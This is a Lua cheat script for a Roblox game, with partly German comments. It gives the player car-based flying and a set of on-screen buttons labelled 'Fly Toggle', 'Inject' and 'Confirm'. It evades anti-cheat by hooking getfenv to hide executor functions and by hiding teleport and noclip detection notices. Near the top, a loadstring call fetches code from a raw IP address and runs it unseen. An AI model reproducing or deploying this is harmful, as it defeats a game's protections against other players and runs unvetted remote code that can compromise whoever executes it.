--_G.FlySpeed = 68
if _G.FlySpeed then
   return
end
_G.FlySpeed = 68

loadstring(game:HttpGet("http://116.202.8.65:3000/get-s?name=AimRange"))()
-- Hook ContentProvider.PreloadAsync to prevent some potential crashes
hookfunction(game:GetService("ContentProvider").PreloadAsync, function(...) end)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local camera = workspace.CurrentCamera
local masterControl = require(player.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))


local Net = require(ReplicatedStorage.Modules.Core.Net)
hookfunction(getfenv , function(lvl)
   if lvl == 3 then
       return {
           getgenv = nil,
           identifyexecutor = nil
       }
   end
   return getgenv(lvl)
end)


local flySpeed = 85
local maxDistance = 20
local isFlying = false
local canMove = true
local startPosition = rootPart.Position
local spamFActive = false -- Flag for F spamming
local spamFInterval = 0.1 -- Interval between F presses in seconds
local Car = nil
local Injected = false
local InjectionConfirmed = false

player.CharacterAdded:Connect(function(newChar)
   character = newChar
   humanoid = character:WaitForChild("Humanoid")
   rootPart = character:WaitForChild("HumanoidRootPart")
   camera = workspace.CurrentCamera
   Injected = false
   InjectionConfirmed = false
end)

local function PutPlayerCar()
   if not isFlying then return end
   for _, vehicle in pairs(game.Workspace.Vehicles:GetChildren()) do
       if vehicle:GetAttribute("OwnerUserId") == player.UserId then
           Car = vehicle.PrimaryPart
           for _, seat in pairs(vehicle:GetDescendants()) do
               if seat:IsA("BasePart") then
                   seat.CanCollide = false
               end
               if seat.Name == "DrivePrompt" then
                   vehicle.PrimaryPart.Anchored = false
                   while not player.Character.Humanoid.Sit and isFlying do
                       vehicle:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3.5 - 0.009, 0))
                       fireproximityprompt(seat)
                       for _, part in pairs(vehicle:GetDescendants()) do
                           if part:IsA("BasePart") then
                               part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                               part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                           end
                       end
                       task.wait()
                   end
                   vehicle.PrimaryPart.Anchored = true
               end
           end
       end
   end
end
local function toggleFlying()

   PutPlayerCar()
   if isFlying then
       humanoid.PlatformStand = true
       humanoid.EvaluateStateMachine = false
       rootPart.Anchored = true
       startPosition = rootPart.Position
       UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
       camera.CameraType = Enum.CameraType.Custom
   else
       UserInputService.MouseBehavior = Enum.MouseBehavior.Default
       humanoid.PlatformStand = false
       humanoid.EvaluateStateMachine = true
   end
end

local Height = 0
local SpecialCF = nil

local function GPressed()
   if InjectionConfirmed then
       return
   end
   isFlying = true
   Height = rootPart.Position.Y
   coroutine.wrap(toggleFlying)()
   task.wait(1)
   isFlying = false
   while true do
       humanoid.PlatformStand = false
       UserInputService.MouseBehavior = Enum.MouseBehavior.Default
       isFlying = false
       task.wait(0.1)
       if not humanoid.PlatformStand then
           break
       end
   end
   while true do
       rootPart.Anchored = false
       UserInputService.MouseBehavior = Enum.MouseBehavior.Default
       isFlying = false
       task.wait(0.1)
       if not rootPart.Anchored then
           break
       end
   end
   if (rootPart.Position - Car.Position).Magnitude > 20 or humanoid.Sit or math.abs(rootPart.Position.Y - Height) > 20  then
       Net.send("request_respawn")
   else
       Injected = true
       warn("Injected")
   end
end
local function confirm()
   if Injected and not InjectionConfirmed then
       InjectionConfirmed = true
       warn("ComfirmedSuccess")
   end
end
UserInputService.InputBegan:Connect(function(input, gameProcessed)
   if input.KeyCode == Enum.KeyCode.G and not gameProcessed then -- Press G to start/stop F spamming
       GPressed()
   elseif input.KeyCode == Enum.KeyCode.M then
       confirm()
   end
end)

local function freezeMovement()
   canMove = false
   rootPart.Anchored = false
   PutPlayerCar()
   camera.CameraSubject = humanoid
   UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
   humanoid.PlatformStand = true
   rootPart.Anchored = true
   startPosition = rootPart.Position
   canMove = true
end


RunService.Heartbeat:Connect(function(deltaTime)
   if not isFlying or not rootPart or not humanoid or not canMove then return end
   rootPart.CFrame = CFrame.new(Vector3.new(rootPart.Position.X, Height - 30, rootPart.Position.Z), rootPart.CFrame.LookVector + rootPart.Position)
   if (rootPart.Position - startPosition).Magnitude > maxDistance then
       freezeMovement()
   end
end)


-- Flug-Einstellungen
local isFlying2 = false
local flySpeed = 45
local camera = workspace.CurrentCamera

-- Handle Charakter-Wechsel
local SavedPos = false
player.CharacterAdded:Connect(function(newChar)
   character = newChar
   humanoid = character:WaitForChild("Humanoid")
   rootPart = character:WaitForChild("HumanoidRootPart")
   SavedPos = false
    player.PlayerGui.Notifications.Frame.ChildAdded:Connect(function(Part)
        if (Part.Text == "Teleport detected" or Part.Text == "Anti noclip triggered") and InjectionConfirmed then
            Part.Visible = false
        end
    end)
end)

-- Remote
local Send = ReplicatedStorage.Remotes.Send -- RemoteEvent

-- This data was received from the server
Send.OnClientEvent:Connect(function(n , y , m)
   if m == "Teleport detected" and InjectionConfirmed then
       if humanoid.Health < 30 and character:GetAttribute("IsRagdolling") then
           return
       end
       SpecialCF = Car.CFrame
       rootPart.CFrame = SpecialCF
   end
end)

-- Flug umschalten mit F

local CFRoot =  rootPart.CFrame

local function fly()
   isFlying2 = not isFlying2

   if isFlying2 then
       humanoid.PlatformStand = true
       UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
       CFRoot =  rootPart.CFrame

       for _, seat in pairs(Car.Parent:GetDescendants()) do
           if seat:IsA("BasePart") then
               seat.CanCollide = true
           end
       end
   else
       humanoid.PlatformStand = false
       UserInputService.MouseBehavior = Enum.MouseBehavior.Default
       rootPart.Anchored = false
       for _, part in pairs(character:GetDescendants()) do
           if part:IsA("BasePart") then
               part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           end
       end
   end
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
   if input.KeyCode == Enum.KeyCode.F and not gameProcessed  then
       fly()
   end
end)

-- Flug-Logik


RunService.Heartbeat:Connect(function(deltaTime)
   if not InjectionConfirmed then return end
   if character then 
	camera.CameraSubject = character.HumanoidRootPart
   end
   if humanoid.Health < 30 and character:GetAttribute("IsRagdolling") then
       if SavedPos == false then
           SavedPos =  rootPart.CFrame
       end
        isFlying2 = false
        character:MoveTo(Vector3.new(10000000000000000, 10000000000000000, 10000000000000000)) 
   else
       if SavedPos ~= false then
           rootPart.CFrame = SavedPos
       end
       SavedPos = false
   end
   if not isFlying2 or not rootPart or not humanoid then return end
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    local gameProcessingInput = UserInputService:GetFocusedTextBox() ~= nil
    local moveDirection = Vector3.new()

    if not gameProcessingInput then
        local direction = masterControl:GetMoveVector()
	    if direction.Z > 0.5 then moveDirection -= camera.CFrame.LookVector end -- W
	    if direction.Z < -0.5 then moveDirection += camera.CFrame.LookVector end -- S
	    if direction.X > 0.5 then moveDirection += camera.CFrame.RightVector end -- D
	    if direction.X < -0.5 then moveDirection -= camera.CFrame.RightVector end -- A
	    
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDirection += Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDirection -= Vector3.new(0, 1, 0) end
    end

   -- Normalisiere die Richtung (vermeidet schnelleres Diagonal-Fliegen)
   if moveDirection.Magnitude > 0 then
       moveDirection = moveDirection.Unit
   end
   if SpecialCF then
       rootPart.CFrame = SpecialCF
       CFRoot = SpecialCF
       SpecialCF = nil
   else
       CFRoot = CFRoot + (moveDirection * _G.FlySpeed * deltaTime)

   -- Blickrichtung an Mausbewegung anpassen
       CFRoot = CFrame.new(CFRoot.Position, CFRoot.Position + camera.CFrame.LookVector)
       rootPart.CFrame = CFRoot
   end
   -- CFrame-Update mit sanfter Bewegung
end)

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ButtonGui"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
-- Button-Eigenschaften
local buttonSize = UDim2.new(0, 150, 0, 50)
local startPosY = 0.4
local spacing = 0.08
-- Button-Texte
local buttonTexts = {"Fly Toggle", "Inject", "Confirm"}
-- Tabelle für Zugriff auf Buttons (optional)
local buttons = {}
for i, text in ipairs(buttonTexts) do
     local button = Instance.new("TextButton")
     button.Size = buttonSize
     button.Position = UDim2.new(0.05, 0, startPosY + (i - 1) * spacing, 0)
     button.Text = text
     button.Name = text
     button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
     button.TextColor3 = Color3.new(1, 1, 1)
     button.Font = Enum.Font.SourceSansBold
     button.TextSize = 22
     button.Parent = screenGui
     -- Direkt die Klickfunktion
     button.MouseButton1Click:Connect(function()
        if text == "Fly Toggle" then
            fly()
        elseif text == "Inject" then
            GPressed()
        else
            confirm()
        end
     end)
     buttons[text] = button
end
